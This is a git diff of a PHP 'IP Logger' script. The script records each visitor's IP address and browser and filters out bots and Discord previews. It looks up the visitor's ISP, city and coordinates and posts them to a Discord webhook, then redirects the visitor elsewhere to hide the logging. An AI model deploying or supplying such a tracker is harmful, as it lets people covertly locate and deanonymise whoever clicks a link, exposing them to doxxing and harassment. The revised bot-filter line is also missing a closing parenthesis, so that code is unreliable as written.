@@ -1,41 +1,47 @@
 <?php
-
-//Get the IP & Info
+/*
+  Get IP
+*/
 $IP       = $_SERVER['REMOTE_ADDR'];
 $Browser  = $_SERVER['HTTP_USER_AGENT'];
 
-//Stop us from picking up bot ips
-if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
-    exit();
-}
+/*
+  Stop us from picking up bot ips
+*/
+if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser) exit();
 
-//Info
-$Curl = curl_init("http://ip-api.com/json/$IP"); //Get the info of the IP using Curl
+/*
+  Info
+*/
+//Get the info of the IP using Curl
+$Curl = curl_init("http://ip-api.com/json/$IP");
 curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
 $Info = json_decode(curl_exec($Curl)); 
 curl_close($Curl);
 
-$ISP = $Info->isp;
-$Country = $Info->country;
-$Region = $Info->regionName;
-$City = $Info->city;
-$COORD = "$Info->lat, $Info->lon"; // Coordinates
+/*
+   Coordinates
+*/
+$COORD = "$Info->lat, $Info->lon";
 
-//Variables
-$Webhook    = ""; //Webhook here.
+/*
+  Variables 
+*/
+//Webhook here.
+$Webhook    = "";
 
-$WebhookTag = "Showcase"; //This will be the name of the webhook when it sends a message.  
+//This will be the name of the webhook when it sends a message.  
+$WebhookTag = "Showcase";
 
-//JS we are going to send to the webhook.
-$JS = array(
+/*
+  JS we are going to send to the webhook.
+*/
+$JS = json_encode(array(
     'username'   => "$WebhookTag - IP Logger" , 
     'avatar_url' => "https://vgy.me/GQe9bJ.png",
-    'content'    => "**__IP Info__**:\nIP: $IP\nISP: $ISP\nBrowser: $Browser\n**__Location__**: \nCountry: $Country\nRegion: $Region\nCity: $City\nCoordinates: $COORD"
-);
+    'content'    => "**__IP Info__**:\nIP: $IP\nISP: $Info->isp\nBrowser: $Browser\n**__Location__**: \nCountry: $Info->country\nRegion: $Info->regionName\nCity: $Info->city\nCoordinates: $COORD"
+));
  
-//Encode that JS so we can post it to the webhook
-$JSON = json_encode($JS);
-
 
 function IpToWebhook($Hook, $Content)
 {
@@ -47,6 +53,5 @@ function IpToWebhook($Hook, $Content)
       return curl_exec($Curl);
 }
 
-IpToWebhook($Webhook, $JSON);
+IpToWebhook($Webhook, $JS);
 header("Location: https://www.littest.site");
-?>
